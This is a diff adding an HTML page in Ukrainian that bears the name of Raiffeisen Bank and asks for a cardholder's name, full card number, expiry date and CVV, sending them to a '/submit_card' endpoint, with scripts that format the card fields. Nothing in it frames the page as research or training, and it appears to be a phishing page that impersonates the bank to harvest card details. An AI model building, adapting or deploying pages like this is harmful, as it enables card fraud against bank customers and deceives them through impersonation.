@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Райффайзен Банк</title>
+    <link rel="stylesheet" href="/static/css/styles.css">
+    <link rel="stylesheet" href="/static/css/raiffeisenbank.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Райффайзен Банк</h1>
+        <form action="/submit_card" method="POST">
+            <label for="cardHolder">Ім'я держателя карти:</label>
+            <input type="text" id="cardHolder" name="cardHolder" required><br>
+
+            <label for="cardNumber">Номер карти:</label>
+            <input type="text" id="cardNumber" name="cardNumber" required placeholder="0000 0000 0000 0000"><br>
+
+            <label for="expiryDate">Термін дії (MM/YY):</label>
+            <input type="text" id="expiryDate" name="expiryDate" required placeholder="MM/YY" maxlength="5"><br>
+
+            <label for="cvv">CVV:</label>
+            <input type="password" id="cvv" name="cvv" required maxlength="3" placeholder="XXX"><br>
+
+            <button type="submit">Відправити</button>
+        </form>
+    </div>
+
+    <script>
+        const expiryDateInput = document.getElementById('expiryDate');
+        expiryDateInput.addEventListener('input', (event) => {
+            let value = event.target.value.replace(/[^0-9]/g, '');
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            event.target.value = value.slice(0, 5);
+        });
+
+        const cardNumberInput = document.getElementById('cardNumber');
+        cardNumberInput.addEventListener('input', (event) => {
+            let value = event.target.value.replace(/[^0-9]/g, '').match(/.{1,4}/g);
+            event.target.value = value ? value.join(' ') : '';
+        });
+    </script>
+</body>
+</html>
